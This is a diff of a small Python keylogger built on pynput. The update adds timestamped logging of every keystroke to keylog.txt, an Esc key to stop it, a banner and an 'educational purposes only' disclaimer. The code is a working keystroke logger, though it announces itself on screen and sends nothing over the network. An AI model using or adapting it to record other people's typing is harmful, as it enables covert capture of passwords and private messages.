@@ -1,30 +1,39 @@
-# ======================================================================================================================
-# Author : Akshay Sannakki
-# Date : 2024-11-07
-# Email : akshaysannakki@gmail.com
-# License : MIT License
-# Description : This Python script implements a simple keylogger using the `pynput` library. 
-#               The keylogger captures keystrokes and logs them to a text file, allowing you to monitor keyboard input. 
-# ======================================================================================================================
-# Disclaimer : For educational purposes only.
-# ======================================================================================================================
+print ("""
+==========================================================================
 
+Author : Akshay Sannakki                                Date : 2024-11-06
+
+Email ID : akshaysannakki@gmail.com                 License : MIT License
+
+==========================================================================
+# Disclaimer : For educational purposes only.
+==========================================================================
+""")
 
 from pynput import keyboard
+import time
 
 def keyPressed(key):
-    try:
-        # Log alphanumeric characters
-        with open("keylog.txt", 'a') as logkey:
-            logkey.write(str(key.char))  # `key.char` is the character
-    except AttributeError:
-        # Log special keys
-        with open("keylog.txt", 'a') as logkey:
-            logkey.write(f'[{key}]')  # Represent special keys within brackets
+    """
+    Logs pressed keys to a file with timestamps.
 
-    print(f"Key pressed: {key}")  # Display the key in the console (optional)
+    Args:
+        key: The key object captured by the listener.
+    """
+    try:
+        with open("keylog.txt", 'a') as logkey:
+            logkey.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
+    except AttributeError:
+        with open("keylog.txt", 'a') as logkey:
+            logkey.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [{key}]\n")
+    print(f"Key pressed: {key}")  # Optional console display
+
+    # Stop keylogger when 'Esc' is pressed
+    if key == keyboard.Key.esc:
+        print("Exiting keylogger...")
+        return False  # This will stop the listener
 
 if __name__ == "__main__":
-    # Set up the listener
+    print("Keylogger started. Press 'Esc' to stop.")
     with keyboard.Listener(on_press=keyPressed) as listener:
-        listener.join()  # Keeps the listener running indefinitely
+        listener.join()
